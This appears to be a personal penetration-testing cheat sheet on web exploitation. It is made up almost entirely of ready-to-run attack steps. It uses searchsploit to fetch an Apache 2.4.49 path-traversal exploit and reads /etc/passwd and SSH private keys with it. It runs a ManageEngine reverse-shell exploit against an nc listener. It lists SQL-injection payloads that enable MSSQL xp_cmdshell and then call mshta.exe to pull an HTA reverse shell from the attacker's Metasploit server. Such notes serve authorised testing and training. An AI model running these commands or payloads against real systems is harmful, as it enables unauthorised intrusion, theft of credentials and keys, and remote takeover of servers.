# 01 - Web Exploitation

Index
- [Exploit DB](#Exploit-DB)
- [Example: direct access](#Example-direct-accesse)
- [Example: reverse shell](#Example-reverse-shell)
- [Example: sqli](#Example-sqli)
    - [MSSQL Error, UNION SELECT](#MSSQL-Error-UNION-SELECT)

## Exploit DB

Exploit search command example: searchsploit $software $version
``` bash
searchsploit apache 2.4.49
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 |  Path
------------------------------------------------------------------------------- ---------------------------------
...
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)       | multiple/webapps/50383.sh
...
------------------------------------------------------------------------------- ---------------------------------
```

Copy exploit on disk:
``` bash
searchsploit -m multiple/webapps/50383.sh
```

## Example: direct access

ID 50383: Apache path traversal
``` bash
bash 50383.sh ./targets.txt /etc/passwd                 ## read file passwd, user enum
bash 50383.sh ./targets.txt /etc/ssh/*pub               ## search ecdsa key
bash 50383.sh ./targets.txt /home/$user/.ssh/id_ecdsa   ## read ecdsa key, possible ssh access
bash 50383.sh ./targets.txt /home/$user/.ssh/id_rsa     ## read rsa key, possible ssh access
```

## Example: reverse shell

ID 48793: ManageEngine reverse shell (auth)
``` bash
python3 48793.py https://192.168.1.1:8443 admin admin $KALI_IP $PORT    ## richiede nc listener: nc -nvlp 443
```

## Example: sqli

### MSSQL Error, UNION SELECT

Check available fields:
``` text
admin' UNION SELECT 1,2,3,4,5--+
admin' UNION SELECT 1,2,3,4--+
admin' UNION SELECT 1,2,3--+
admin' UNION SELECT 1,2--+
```

Enable xp_cmdshell:
``` text
admin' UNION SELECT 1,2; EXEC sp_configure 'show advanced options', 1--+
admin' UNION SELECT 1,2; RECONFIGURE--+
admin' UNION SELECT 1,2; EXEC sp_configure 'xp_cmdshell', 1--+
admin' UNION SELECT 1,2; RECONFIGURE--+
```

HTA_listener:
``` bash
msf6 > use exploit/windows/misc/hta_server
msf6 exploit(windows/misc/hta_server) > set LHOST $KALI     ##Â set attacker IP
LHOST => $KALI
msf6 exploit(windows/misc/hta_server) > exploit
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/misc/hta_server) > 
[*] Started reverse TCP handler on 192.168.45.226:4444 
[*] Using URL: http://$KALI:8888/Kl4Su1ud80QLi.hta          ## HTA url, reverse shell target
[*] Server started.
```

Exploiting:
``` text
admin' UNION SELECT 1,2; EXEC xp_cmdshell 'mshta.exe http://$KALI:8888/Kl4Su1ud80QLi.hta'--+
```
